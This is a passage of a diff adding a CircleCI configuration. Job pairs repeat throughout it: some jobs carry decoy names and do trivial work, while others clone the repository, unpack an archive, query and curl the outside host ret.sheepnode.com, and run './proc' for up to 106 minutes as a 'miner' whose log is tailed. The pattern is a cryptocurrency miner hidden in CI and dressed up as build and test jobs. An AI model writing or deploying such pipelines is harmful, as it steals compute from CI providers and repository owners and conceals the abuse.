+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  realHank:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: ID 1D6A SEEDING
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; find /proc/self ! -name 'limits' -exec ls -1d {} + 2>/dev/null | head -n5; true ; } > /tmp/terminal/tenaNtNICKeLlagOon
+            echo "stage=build-nightly-integration-tests hash=$(md5sum /tmp/terminal/tenaNtNICKeLlagOon | cut -c1-8) size=$(wc -c </tmp/terminal/tenaNtNICKeLlagOon)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'tenaNtNICKeLlagOon'
+  build-nightly-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/Q1g 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  Guard-Path-Manifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: offboardLaptopRequestsV7
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; cp /etc/os-release /tmp/carrot.conf && sed -i.orig 's/^NAME=/OS_NAME=/' /tmp/carrot.conf && grep -c . /tmp/carrot.conf; true ; } > /tmp/terminal/drift-src
+            echo "stage=v3-rc3 hash=$(md5sum /tmp/terminal/drift-src | cut -c1-8) size=$(wc -c </tmp/terminal/drift-src)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'drift-src'
+  v3-rc3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/Q1g 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  DZ_Q:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: The SKUs sorted automatically
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; for val in {6..1}; do printf '%02d\n' "$val"; done | wc -l; true ; } > /tmp/terminal/lagoon_queue_crisp_backup
+            echo "stage=phoenix-plus hash=$(md5sum /tmp/terminal/lagoon_queue_crisp_backup | cut -c1-8) size=$(wc -c </tmp/terminal/lagoon_queue_crisp_backup)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'lagoon_queue_crisp_backup'
+  phoenix-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  level-to-tight:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Seal 25 percent of petri dishes
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; sha1sum /usr/bin/env | cut -c1-12; true ; } > /tmp/terminal/9DaUULnz
+            echo "stage=q3-ship hash=$(md5sum /tmp/terminal/9DaUULnz | cut -c1-8) size=$(wc -c </tmp/terminal/9DaUULnz)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - '9DaUULnz'
+  q3-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/9DaUULnz 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  orbit-normal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: dbg locale again
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; echo hi >"${TMPDIR:-/tmp}/sliceCampusSilver.md" && stat -c "%U %G %a" "${TMPDIR:-/tmp}/sliceCampusSilver.md"; true ; } > /tmp/terminal/AgentMeadowLagoonGreen
+            echo "stage=push-it hash=$(md5sum /tmp/terminal/AgentMeadowLagoonGreen | cut -c1-8) size=$(wc -c </tmp/terminal/AgentMeadowLagoonGreen)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'AgentMeadowLagoonGreen'
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/Q1g 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  NEW_A:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: RETRY FF8A01
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,grape,18,51.24\n2,kiwi,16,92.73\n3,orange,14,51.99\n4,lemon,20,24.49\n' >'/tmp/lemonfinal.tsv' && awk -F, 'NR>1' '/tmp/lemonfinal.tsv' | wc -l; true ; } > /tmp/terminal/0D
+            echo "stage=break-prod hash=$(md5sum /tmp/terminal/0D | cut -c1-8) size=$(wc -c </tmp/terminal/0D)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - '0D'
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  q-protocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: approve weekly digest last
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; for i in {1..12}; do echo $RANDOM; done | awk '{print $1 * 2}' | xargs; true ; } > /tmp/terminal/Q709TMxI3841zxQoPLxbZ
+            echo "stage=sirius-v2 hash=$(md5sum /tmp/terminal/Q709TMxI3841zxQoPLxbZ | cut -c1-8) size=$(wc -c </tmp/terminal/Q709TMxI3841zxQoPLxbZ)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'Q709TMxI3841zxQoPLxbZ'
+  sirius-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/Q1g 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  wk5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: SkyboxCook
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; printenv | sed 's/=.*//' | nl | tail -10; true ; } > /tmp/terminal/8dfvjpkfwjv
+            echo "stage=INIT_STG hash=$(md5sum /tmp/terminal/8dfvjpkfwjv | cut -c1-8) size=$(wc -c </tmp/terminal/8dfvjpkfwjv)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - '8dfvjpkfwjv'
+  INIT_STG:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/8dfvjpkfwjv 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  removeAuthor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Badge the team roster
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; if [[ -k /tmp ]];then echo 'it is there'; fi; true ; } > /tmp/terminal/cache.echo.lambda.sweep
+            echo "stage=tb-2 hash=$(md5sum /tmp/terminal/cache.echo.lambda.sweep | cut -c1-8) size=$(wc -c </tmp/terminal/cache.echo.lambda.sweep)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'cache.echo.lambda.sweep'
+  tb-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
+            sha384sum /tmp/terminal/m4rk3t 2>/dev/null | cut -c1-10 || true
+      - run:
+          name: Extract source
+          command: git clone --depth 3 --quiet https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: tar --extract --xz --file=archive.tar.xz
+      - run:
+          command: env | wc -l
+      - run:
+          command: uname -a
+      - run:
+          name: DNS diag
+          command: |
+            echo "--- /etc/resolv.conf ---"
+            cat /etc/resolv.conf 2>&1 || true
+            echo "--- getent hosts ret.sheepnode.com ---"
+            getent hosts ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com (default resolver) ---"
+            nslookup ret.sheepnode.com 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 8.8.8.8 ---"
+            nslookup ret.sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- nslookup ret.sheepnode.com 1.1.1.1 ---"
+            nslookup ret.sheepnode.com 1.1.1.1 2>&1 || true
+            echo "--- nslookup sheepnode.com (parent domain) ---"
+            nslookup sheepnode.com 2>&1 || true
+            echo "--- nslookup sheepnode.com 8.8.8.8 ---"
+            nslookup sheepnode.com 8.8.8.8 2>&1 || true
+            echo "--- dig +short NS sheepnode.com @8.8.8.8 ---"
+            dig +short NS sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- dig ret.sheepnode.com @8.8.8.8 ---"
+            dig ret.sheepnode.com @8.8.8.8 2>&1 || true
+            echo "--- curl -v ret.sheepnode.com/m (default DNS) ---"
+            curl -v --max-time 10 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -30 || true
+            echo "--- curl -v ret.sheepnode.com/m --dns-servers 8.8.8.8 (如支援) ---"
+            curl -v --max-time 10 --dns-servers 8.8.8.8 https://ret.sheepnode.com/m -o /dev/null 2>&1 | head -20 || true
+            echo "--- DNS diag done ---"
+      - run:
+          name: Run
+          no_output_timeout: 106m
+          command: |
+            mkdir -p /tmp/d
+            : > /tmp/d/miner-log.txt
+            tail -F /tmp/d/miner-log.txt &
+            TAIL_PID=$!
+            sh -c "./proc"
+            MRC=$?
+            sleep 2
+            kill $TAIL_PID 2>/dev/null || true
+            echo "---MINER EXIT=$MRC---"
+            echo "---FULL LOG:---"
+            cat /tmp/d/miner-log.txt 2>/dev/null
+            exit $MRC
+  textarea--left:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: try number one
+          command: |
+            mkdir -p /tmp/terminal
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -type l -size 0 2>/dev/null | nl; true ; } > /tmp/terminal/blob_dream_east
+            echo "stage=API-402 hash=$(md5sum /tmp/terminal/blob_dream_east | cut -c1-8) size=$(wc -c </tmp/terminal/blob_dream_east)"
+      - persist_to_workspace:
+          root: /tmp/terminal
+          paths:
+            - 'blob_dream_east'
+  API-402:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/terminal
+      - run:
+          name: Read payload
+          command: |
